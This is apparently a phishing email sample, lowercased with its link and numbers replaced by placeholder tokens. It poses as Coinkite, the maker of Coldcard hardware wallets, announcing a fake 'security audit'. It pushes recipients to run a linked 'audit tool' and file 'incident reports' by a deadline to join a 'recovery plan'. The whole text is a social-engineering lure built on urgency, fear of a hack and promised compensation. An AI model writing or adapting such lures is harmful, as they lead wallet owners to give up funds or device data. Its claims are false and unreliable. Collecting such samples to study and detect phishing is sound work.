coldcard device verification incident report tool coldcard we are writing to inform you of a coordinated security audit now underway across the coldcard device network recent findings have prompted us to verify the integrity of hardware across all revisions and your participation is needed we have published a dedicated audit incident reporting tool the tool performs two critical functions network verification run the audit utility to confirm your device revision and rng status this data is critical for securing the ecosystem you will be able to confirm if your device is safe or if you are prone to the hack incident filing if you have experienced unauthorized transactions use the tool to generate a verified incident report using device level metadata this is how you get to be in our recovery plan please access the tool and complete your audit access the audit tool urltoken what you need to know the process is air gapped and does not require your recovery seed at any point all hardware revisions are included only users who generate incident reports will be included in the recovery plan please complete your verification by august 10 numtoken numtoken coinkite inc toronto canada don t trust verify
